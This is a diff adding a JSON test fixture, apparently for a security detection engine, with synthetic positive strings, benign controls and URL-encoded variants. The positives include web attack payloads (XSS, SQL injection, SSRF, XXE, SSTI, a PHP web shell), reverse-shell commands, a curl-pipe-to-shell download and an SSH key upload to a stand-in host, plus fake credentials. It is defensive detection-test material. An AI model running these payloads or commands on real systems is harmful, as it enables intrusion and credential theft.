@@ -1,0 +1,635 @@
+{
+  "notes": "Strings sintéticas para correspondência; não executar. IDs esperados são positivos mínimos, não lista exclusiva de matches. Os controles benignos não devem gerar correspondências.",
+  "positive": [
+    {
+      "id": "web.xss.event-handler",
+      "text": "GET /search?q=<img src=x onerror=alert(1)>"
+    },
+    {
+      "id": "web.xss.block-response",
+      "text": "WAF: XSS attempt blocked"
+    },
+    {
+      "id": "web.sql.boolean-tautology",
+      "text": "GET /login?user=' or 1=1"
+    },
+    {
+      "id": "web.sql.mysql-sleep",
+      "text": "request parameter: 1 and sleep(5)"
+    },
+    {
+      "id": "web.sql.union-select",
+      "text": "request q=' union select username from accounts"
+    },
+    {
+      "id": "web.sql.mysql-error",
+      "text": "Database response: You have an error in your SQL syntax"
+    },
+    {
+      "id": "web.cmd.pipe-download",
+      "text": "received command: curl https://example.invalid/script | sh"
+    },
+    {
+      "id": "web.cmd.shellshock",
+      "text": "User-Agent: () { :; }; echo test"
+    },
+    {
+      "id": "web.path.parent-chain",
+      "text": "GET /download?file=../../../../etc/passwd"
+    },
+    {
+      "id": "web.include.php-filter",
+      "text": "GET /?file=php://filter/convert.base64-encode/resource=index.php"
+    },
+    {
+      "id": "web.ssrf.aws-credentials",
+      "text": "fetch target=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    },
+    {
+      "id": "web.ssrf.loopback-service",
+      "text": "GET /fetch?url=http://127.0.0.1:2375/containers/json"
+    },
+    {
+      "id": "web.xxe.file-entity",
+      "text": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"
+    },
+    {
+      "id": "web.ssti.jinja-introspection",
+      "text": "GET /?name={{x.__class__.__mro__}}"
+    },
+    {
+      "id": "web.ssti.spring-expression",
+      "text": "template=${new java.lang.ProcessBuilder('example')}"
+    },
+    {
+      "id": "web.deser.json-type-process",
+      "text": "payload={\"$type\":\"System.Diagnostics.Process, System\"}"
+    },
+    {
+      "id": "web.deser.python-reduce",
+      "text": "serialized=cos\nsystem\n"
+    },
+    {
+      "id": "web.upload.double-extension",
+      "text": "Content-Disposition: form-data; name=upload; filename=\"photo.jpg.php\""
+    },
+    {
+      "id": "web.upload.php-command",
+      "text": "uploaded fragment: system($_POST['cmd']);"
+    },
+    {
+      "id": "net.reverse.bash-tcp",
+      "text": "command received: bash -i >& /dev/tcp/192.0.2.1/4444"
+    },
+    {
+      "id": "net.reverse.socat",
+      "text": "observed: socat TCP:192.0.2.1:4444 EXEC:/bin/sh"
+    },
+    {
+      "id": "net.c2.chisel-reverse",
+      "text": "process: chisel client https://example.invalid R:socks"
+    },
+    {
+      "id": "net.exfil.sensitive-upload",
+      "text": "process: curl --upload-file /home/demo/.ssh/id_rsa https://example.invalid"
+    },
+    {
+      "id": "auth.private-key",
+      "text": "debug value=-----BEGIN PRIVATE KEY-----"
+    },
+    {
+      "id": "auth.lockout-response",
+      "text": "Too many failed login attempts"
+    },
+    {
+      "id": "cloud.aws.stop-logging",
+      "text": "{\"eventName\":\"StopLogging\",\"userIdentity\":{\"type\":\"IAMUser\"}}"
+    },
+    {
+      "id": "cloud.aws.public-bucket",
+      "text": "{\"eventName\":\"PutBucketPolicy\",\"policy\":{\"Principal\":\"*\"}}"
+    },
+    {
+      "id": "cloud.azure.logging-delete",
+      "text": "operationName=Microsoft.Insights/diagnosticSettings/delete"
+    },
+    {
+      "id": "cloud.gcp.public-iam",
+      "text": "methodName=SetIamPolicy members=allUsers"
+    },
+    {
+      "id": "kube.exec",
+      "text": "requestURI=/api/v1/namespaces/demo/pods/api-1/exec?command=date"
+    },
+    {
+      "id": "kube.hostpath-root",
+      "text": "manifest={\"hostPath\":{\"path\":\"/\"}}"
+    },
+    {
+      "id": "kube.forbidden-response",
+      "text": "User demo cannot get resource \"secrets\" in API group"
+    },
+    {
+      "id": "miner.xmrig",
+      "text": "process=xmrig --url pool.example.invalid:3333"
+    },
+    {
+      "id": "host.ps.encoded",
+      "text": "powershell.exe -enc QUJDREVGR0hJSktMTU5PUA=="
+    },
+    {
+      "id": "response.web.directory-index",
+      "text": "<title>Index of /backup</title><a href=\"../\">Parent Directory</a>"
+    },
+    {
+      "id": "response.web.git-head",
+      "text": "ref: refs/heads/main"
+    },
+    {
+      "id": "response.web.git-config",
+      "text": "[core]\n repositoryformatversion = 0\n bare = false"
+    },
+    {
+      "id": "response.web.git-packed-refs",
+      "text": "# pack-refs with: peeled fully-peeled\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa refs/heads/main"
+    },
+    {
+      "id": "response.web.phpinfo",
+      "text": "<title>phpinfo()</title><h1>PHP Version 8.3</h1>"
+    },
+    {
+      "id": "response.web.aspnet-error",
+      "text": "Server Error in '/' Application. Exception Details: System.InvalidOperationException"
+    },
+    {
+      "id": "response.web.django-debug",
+      "text": "Django Version: 5.2\nDEBUG = True"
+    },
+    {
+      "id": "response.web.rails-error",
+      "text": "ActionController::RoutingError\nApplication Trace\nParameters: {\"id\":\"1\"}"
+    },
+    {
+      "id": "response.web.spring-env",
+      "text": "{\"activeProfiles\":[\"production\"],\"propertySources\":[{\"name\":\"systemEnvironment\"}]}"
+    },
+    {
+      "id": "response.web.heap-profile",
+      "text": "download body: JAVA PROFILE 1.0.2"
+    },
+    {
+      "id": "response.web.source-map",
+      "text": "{\"sources\":[\"src/server.js\"],\"sourcesContent\":[\"function internalHandler() { return databaseQuery(); }\"]}"
+    },
+    {
+      "id": "response.web.backup-download",
+      "text": "HTTP/1.1 200 OK\nContent-Disposition: attachment; filename=\"database.sql\""
+    },
+    {
+      "id": "response.config.env-database",
+      "text": "DB_PASSWORD=ExampleOnlyPassword42"
+    },
+    {
+      "id": "response.config.laravel-key",
+      "text": "APP_KEY=base64:QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0123456789abc"
+    },
+    {
+      "id": "response.config.wordpress-db",
+      "text": "define('DB_PASSWORD', 'ExampleOnlyPassword42');"
+    },
+    {
+      "id": "response.config.django-secret",
+      "text": "SECRET_KEY = 'example-only-do-not-use-1234567890'"
+    },
+    {
+      "id": "response.config.spring-password",
+      "text": "spring.datasource.password=ExampleOnlyPassword42"
+    },
+    {
+      "id": "response.config.web-connection",
+      "text": "<add name=\"Main\" connectionString=\"Server=db;User ID=app;Password=ExampleOnlyPassword42;\"/>"
+    },
+    {
+      "id": "response.config.ini-credential",
+      "text": "[database]\nusername=app\npassword=ExampleOnlyPassword42"
+    },
+    {
+      "id": "response.config.netrc",
+      "text": "machine service.example.invalid login demo password ExampleOnlyPassword42"
+    },
+    {
+      "id": "response.config.composer-auth",
+      "text": "{\"http-basic\":{\"repo.example.invalid\":{\"username\":\"demo\",\"password\":\"ExampleOnlyPassword42\"}}}"
+    },
+    {
+      "id": "response.config.terraform-state",
+      "text": "{\"version\":4,\"terraform_version\":\"1.9.0\",\"resources\":[{\"type\":\"example_resource\"}]}"
+    },
+    {
+      "id": "response.config.ansible-vault",
+      "text": "$ANSIBLE_VAULT;1.1;AES256\n0123456789abcdef0123456789abcdef0123456789abcdef"
+    },
+    {
+      "id": "response.sql.mysql-query",
+      "text": "You have an error in your SQL syntax near 'SELECT secret FROM accounts' at line 1"
+    },
+    {
+      "id": "response.sql.pg-cast",
+      "text": "ERROR: invalid input syntax for type integer: \"payload-example\""
+    },
+    {
+      "id": "response.sql.pg-statement",
+      "text": "ERROR: permission denied for table accounts\nSTATEMENT: SELECT * FROM accounts;"
+    },
+    {
+      "id": "response.sql.mssql-quote",
+      "text": "Unclosed quotation mark after the character string 'payload-example'."
+    },
+    {
+      "id": "response.sql.mssql-conversion",
+      "text": "Conversion failed when converting the varchar value 'example-sensitive-value' to data type int"
+    },
+    {
+      "id": "response.sql.oracle-statement",
+      "text": "ORA-00933: SQL command not properly ended\nSQL: SELECT * FROM accounts;"
+    },
+    {
+      "id": "response.sql.oracle-network",
+      "text": "ORA-29273: HTTP request failed\nORA-06512: at \"SYS.UTL_HTTP\", line 1130"
+    },
+    {
+      "id": "response.sql.sqlite-query",
+      "text": "sqlite3.OperationalError: near \"FROM\": syntax error\nQuery: SELECT FROM accounts"
+    },
+    {
+      "id": "response.sql.odbc-access",
+      "text": "[Microsoft][ODBC Microsoft Access Driver] Syntax error in query expression 'name=example'"
+    },
+    {
+      "id": "response.sql.db2-context",
+      "text": "SQLCODE=-104, SQLSTATE=42601, SQLERRMC=example-token;END-OF-STATEMENT"
+    },
+    {
+      "id": "response.sql.mongo-key",
+      "text": "E11000 duplicate key error collection: app.users index: email_1 dup key: { email: \"demo@example.invalid\" }"
+    },
+    {
+      "id": "response.sql.neo4j-query",
+      "text": "Neo.ClientError.Statement.SyntaxError: Invalid input 'x' (line 1, column 7)"
+    },
+    {
+      "id": "response.db.mysql-dump",
+      "text": "-- MySQL dump 10.13 Distrib 8.0\n-- Host: localhost Database: application"
+    },
+    {
+      "id": "response.db.pg-dump",
+      "text": "-- PostgreSQL database dump\n-- Dumped from database version 16.0"
+    },
+    {
+      "id": "response.db.sqlite-dump",
+      "text": "PRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE users(id INTEGER, name TEXT);"
+    },
+    {
+      "id": "response.db.account-inserts",
+      "text": "INSERT INTO users (username,password_hash) VALUES ('demo','hash-example');"
+    },
+    {
+      "id": "response.db.pg-copy",
+      "text": "COPY public.accounts (name, password_hash) FROM stdin;\ndemo hash-example"
+    },
+    {
+      "id": "response.db.mysql-auth-result",
+      "text": "User | Host | authentication_string\ndemo | localhost | *AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "id": "response.db.mongo-credential",
+      "text": "{\"_id\":{\"$oid\":\"0123456789abcdef01234567\"},\"password_hash\":\"example-hash-value\"}"
+    },
+    {
+      "id": "response.db.redis-info",
+      "text": "# Server\nredis_version:7.2.0"
+    },
+    {
+      "id": "response.db.elasticsearch-secret",
+      "text": "{\"_index\":\"app-logs\",\"_source\":{\"access_token\":\"example-token-not-valid-123\"}}"
+    },
+    {
+      "id": "response.db.cassandra-schema",
+      "text": "CREATE KEYSPACE application WITH replication = {'class':'SimpleStrategy','replication_factor':'1'};"
+    },
+    {
+      "id": "response.cloud.aws-credentials",
+      "text": "{\"AccessKeyId\":\"ASIAABCDEFGHIJKLMNOP\",\"SecretAccessKey\":\"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd\"}"
+    },
+    {
+      "id": "response.cloud.aws-identity-document",
+      "text": "{\"accountId\":\"123456789012\",\"instanceId\":\"i-0123456789abcdef0\",\"region\":\"example-region-1\"}"
+    },
+    {
+      "id": "response.cloud.aws-instance-profile",
+      "text": "{\"InstanceProfileArn\":\"arn:aws:iam::123456789012:instance-profile/demo\",\"InstanceProfileId\":\"AIPAEXAMPLE123\"}"
+    },
+    {
+      "id": "response.cloud.sts-xml-credentials",
+      "text": "<Credentials><AccessKeyId>ASIAABCDEFGHIJKLMNOP</AccessKeyId><SecretAccessKey>ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd</SecretAccessKey></Credentials>"
+    },
+    {
+      "id": "response.cloud.aws-caller-identity",
+      "text": "{\"UserId\":\"EXAMPLEUSER123\",\"Account\":\"123456789012\",\"Arn\":\"arn:aws:sts::123456789012:assumed-role/demo/session\"}"
+    },
+    {
+      "id": "response.cloud.gcp-metadata-token",
+      "text": "{\"access_token\":\"ya29.EXAMPLEonlyNOTvalid0123456789\",\"expires_in\":3599,\"token_type\":\"Bearer\"}"
+    },
+    {
+      "id": "response.cloud.gcp-service-key",
+      "text": "{\"type\":\"service_account\",\"project_id\":\"example\",\"private_key\":\"-----BEGIN PRIVATE KEY-----example\"}"
+    },
+    {
+      "id": "response.cloud.azure-managed-token",
+      "text": "{\"access_token\":\"exampleTokenNotValid0123456789012345\",\"expires_on\":\"1800000000\",\"resource\":\"https://management.azure.com/\"}"
+    },
+    {
+      "id": "response.cloud.azure-instance",
+      "text": "{\"subscriptionId\":\"00000000-0000-0000-0000-000000000000\",\"vmId\":\"11111111-1111-1111-1111-111111111111\"}"
+    },
+    {
+      "id": "response.cloud.azure-storage-key",
+      "text": "{\"keyName\":\"key1\",\"value\":\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUV==\",\"permissions\":\"FULL\"}"
+    },
+    {
+      "id": "response.secret.access-jwt",
+      "text": "{\"access_token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJleGFtcGxlIn0.NOT_A_VALID_SIGNATURE_123\"}"
+    },
+    {
+      "id": "response.secret.refresh-token",
+      "text": "{\"refresh_token\":\"exampleRefreshTokenNotValid123456\",\"token_type\":\"Bearer\"}"
+    },
+    {
+      "id": "response.secret.oauth-client",
+      "text": "{\"client_id\":\"example-application\",\"client_secret\":\"exampleOnlySecret123456789\"}"
+    },
+    {
+      "id": "response.secret.github-token",
+      "text": "credential=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    },
+    {
+      "id": "response.secret.gitlab-token",
+      "text": "credential=glpat-EXAMPLEONLY1234567890"
+    },
+    {
+      "id": "response.secret.npm-token",
+      "text": "//registry.npmjs.org/:_authToken=npm_EXAMPLEONLYNOTVALID0123456789012345"
+    },
+    {
+      "id": "response.secret.docker-auth",
+      "text": "{\"auths\":{\"registry.example.invalid\":{\"auth\":\"ZGVtbzpleGFtcGxlLW9ubHk=\"}}}"
+    },
+    {
+      "id": "response.secret.kube-client-key",
+      "text": "client-key-data: QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0123456789abc"
+    },
+    {
+      "id": "response.secret.azure-sas",
+      "text": "https://example.blob.core.windows.net/data/file?sv=2025-01-01&sp=r&sig=EXAMPLEONLYNOTVALID0123456789"
+    },
+    {
+      "id": "response.secret.database-uri",
+      "text": "postgresql://demo:ExampleOnlyPassword42@db.example.invalid/application"
+    },
+    {
+      "id": "response.secret.pgp-private",
+      "text": "-----BEGIN PGP PRIVATE KEY BLOCK-----"
+    },
+    {
+      "id": "response.trace.python-exec",
+      "text": "Traceback (most recent call last):\n  File \"/app/task.py\", line 12\nsubprocess.CalledProcessError: Command 'example' returned non-zero exit status 1."
+    },
+    {
+      "id": "response.trace.java-process",
+      "text": "java.io.IOException: Cannot run program \"example-tool\": error=2, No such file or directory"
+    },
+    {
+      "id": "response.trace.php-disabled",
+      "text": "Warning: shell_exec() has been disabled for security reasons"
+    },
+    {
+      "id": "response.trace.node-spawn",
+      "text": "Error: spawn /bin/sh EACCES"
+    },
+    {
+      "id": "response.trace.xml-file",
+      "text": "warning: failed to load external entity \"file:///etc/passwd\""
+    },
+    {
+      "id": "response.trace.template-internal",
+      "text": "UndefinedError: object has no attribute '__globals__'"
+    },
+    {
+      "id": "response.host.passwd",
+      "text": "HTTP body: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
+    },
+    {
+      "id": "response.host.group",
+      "text": "root:x:0:\nsudo:x:27:demo"
+    },
+    {
+      "id": "response.host.shadow-account",
+      "text": "demo:$6$salt$synthetic.hash.value:20000:0:99999:7:::"
+    },
+    {
+      "id": "response.host.id",
+      "text": "output: uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    },
+    {
+      "id": "response.host.uname",
+      "text": "Linux demo 6.1.0-test #1 SMP test x86_64 GNU/Linux"
+    },
+    {
+      "id": "response.host.os-release",
+      "text": "NAME=\"Example Linux\"\nVERSION_ID=\"24\""
+    },
+    {
+      "id": "response.host.cpuinfo",
+      "text": "processor : 0\nvendor_id : ExampleVendor\nmodel name : Example CPU"
+    },
+    {
+      "id": "response.host.process-status",
+      "text": "Name:\tphp-fpm\nState:\tS (sleeping)\nPid:\t123\nUid:\t33\t33\t33\t33"
+    },
+    {
+      "id": "response.host.ps-aux",
+      "text": "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\nroot 1 0.0 0.1 1000 500 ? Ss 00:00 0:00 /sbin/init"
+    },
+    {
+      "id": "response.host.ps-ef",
+      "text": "UID PID PPID C STIME TTY TIME CMD\nroot 1 0 0 00:00 ? 00:00:01 /sbin/init"
+    },
+    {
+      "id": "response.host.ls-long",
+      "text": "-rw-r--r-- 1 root root 1234 Sep 22 12:30 passwd"
+    },
+    {
+      "id": "response.host.netstat",
+      "text": "Proto Recv-Q Send-Q Local Address Foreign Address State\ntcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN"
+    },
+    {
+      "id": "response.host.ss",
+      "text": "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*"
+    },
+    {
+      "id": "response.host.ip-address",
+      "text": "2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state UP\n    link/ether 02:00:00:00:00:01 brd ff:ff:ff:ff:ff:ff"
+    },
+    {
+      "id": "response.host.route-table",
+      "text": "Destination Gateway Genmask Flags MSS Window irtt Iface\n0.0.0.0 192.0.2.1 0.0.0.0 UG 0 0 0 eth0"
+    },
+    {
+      "id": "response.host.mount-output",
+      "text": "/dev/sda1 on / type ext4 (rw,relatime)"
+    },
+    {
+      "id": "response.host.df-output",
+      "text": "Filesystem Size Used Avail Use% Mounted on\n/dev/sda1 20G 10G 10G 50% /"
+    },
+    {
+      "id": "response.host.sudo-list",
+      "text": "User demo may run the following commands on server:\n    (ALL : ALL) NOPASSWD: /usr/bin/backup"
+    },
+    {
+      "id": "response.host.sudoers",
+      "text": "demo ALL=(ALL:ALL) NOPASSWD: ALL"
+    },
+    {
+      "id": "response.host.linux-capabilities",
+      "text": "/usr/local/bin/custom cap_setuid=ep"
+    },
+    {
+      "id": "response.host.kernel-proc-maps",
+      "text": "7f0000000000-7f0000020000 r-xp 00000000 08:01 123 /usr/lib/libc.so.6"
+    },
+    {
+      "id": "response.host.whoami-sid",
+      "text": "example\\demo S-1-5-21-111-222-333-1001"
+    },
+    {
+      "id": "response.host.whoami-privileges",
+      "text": "SeImpersonatePrivilege Impersonate a client after authentication Enabled"
+    },
+    {
+      "id": "response.host.whoami-groups",
+      "text": "BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default"
+    },
+    {
+      "id": "response.host.systeminfo-en",
+      "text": "OS Name: Microsoft Windows Server 2022\nOS Version: 10.0.20348 N/A Build 20348"
+    },
+    {
+      "id": "response.host.systeminfo-pt",
+      "text": "Nome do sistema operacional: Microsoft Windows Server 2022\nVersão do sistema operacional: 10.0.20348"
+    },
+    {
+      "id": "response.host.ipconfig",
+      "text": "   IPv4 Address. . . . . : 192.0.2.10\n   Subnet Mask . . . . . : 255.255.255.0"
+    },
+    {
+      "id": "response.host.dir",
+      "text": " Directory of C:\\inetpub\\wwwroot\n\n09/22/2026  12:30 PM    <DIR>          ."
+    },
+    {
+      "id": "response.host.tasklist",
+      "text": "Image Name PID Session Name Session# Mem Usage\n========================= ======== ================ =========== ============\nexample.exe 1234 Services 0 1,024 K"
+    },
+    {
+      "id": "response.host.service-query",
+      "text": "SERVICE_NAME: ExampleService\n        TYPE : 10 WIN32_OWN_PROCESS\n        STATE : 4 RUNNING"
+    },
+    {
+      "id": "response.host.registry-query",
+      "text": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Example\n    InstallPath    REG_SZ    C:\\Example"
+    },
+    {
+      "id": "response.host.query-user",
+      "text": " USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME\n demo console 1 Active none 9/22/2026 12:30 PM"
+    },
+    {
+      "id": "response.host.netuser",
+      "text": "User name demo\nFull Name Demo Account\nComment Test account\nAccount active Yes"
+    },
+    {
+      "id": "response.host.localgroup",
+      "text": "Alias name Administrators\nComment Local administrators\n\nMembers\n-------------------------\nexample\\demo"
+    },
+    {
+      "id": "response.host.klist",
+      "text": "Cached Tickets: (1)\n#0> Client: demo @ EXAMPLE.TEST\n    Server: krbtgt/EXAMPLE.TEST @ EXAMPLE.TEST"
+    },
+    {
+      "id": "response.host.ntlm-dump",
+      "text": "demo:1001:aad3b435b51404eeaad3b435b51404ee:00000000000000000000000000000000:::"
+    },
+    {
+      "id": "response.host.powershell-version",
+      "text": "PSVersion 7.4.0\nPSEdition Core"
+    },
+    {
+      "id": "response.host.wmic-account",
+      "text": "Name SID\ndemo S-1-5-21-111-222-333-1001"
+    },
+    {
+      "id": "response.host.wmic-products",
+      "text": "IdentifyingNumber Name Version\n{11111111-2222-3333-4444-555555555555} Example App 1.0"
+    },
+    {
+      "id": "response.host.netstat-win",
+      "text": "  Proto Local Address Foreign Address State PID\n  TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4"
+    },
+    {
+      "id": "response.host.route-print",
+      "text": "Network Destination Netmask Gateway Interface Metric\n0.0.0.0 0.0.0.0 192.0.2.1 192.0.2.10 25"
+    },
+    {
+      "id": "response.host.passwd",
+      "text": "HTTP response body=\"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\""
+    }
+  ],
+  "benign": [
+    "GET /health HTTP/1.1 status=200 latency=4ms",
+    "user=admin authentication succeeded",
+    "error: shell not found in display configuration",
+    "SELECT id,name FROM users WHERE id=42",
+    "backup finished successfully: records=12 bytes=1024",
+    "POST /upload filename=report.pdf status=201",
+    "service=api request_id=abc123 status=200",
+    "GET /assets/logo.svg HTTP/1.1 status=304",
+    "GET /.git/HEAD HTTP/1.1 status=404",
+    "GET /etc/passwd HTTP/1.1 status=403",
+    "DB_PASSWORD=********",
+    "SECRET_KEY=\"\"",
+    "spring.datasource.password=${DB_PASSWORD}",
+    "Public PGP key: -----BEGIN PGP PUBLIC KEY BLOCK-----",
+    "Authorization: Bearer [REDACTED]",
+    "HTTP/1.1 200 OK\nContent-Disposition: attachment; filename=\"report.pdf\"",
+    "Query executed successfully: SELECT id FROM inventory",
+    "SQLSTATE 00000 successful completion",
+    "Path contains words phpinfo and Index of but no HTML response",
+    "{\"client_id\":\"public-client\",\"client_secret\":\"[REDACTED]\"}",
+    "{\"access_token\":\"[REDACTED]\",\"token_type\":\"Bearer\"}",
+    "{\"auths\":{\"registry.example.invalid\":{\"credsStore\":\"desktop\"}}}"
+  ],
+  "normalizedPositive": [
+    {
+      "id": "web.xss.event-handler",
+      "text": "GET /?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
+    },
+    {
+      "id": "web.sql.boolean-tautology",
+      "text": "GET /?q=%2527%2520or%25201%253D1"
+    },
+    {
+      "id": "web.xxe.file-entity",
+      "text": "payload=\\u003c!ENTITY xxe SYSTEM 'file:///etc/passwd'\\u003e"
+    }
+  ]
+}
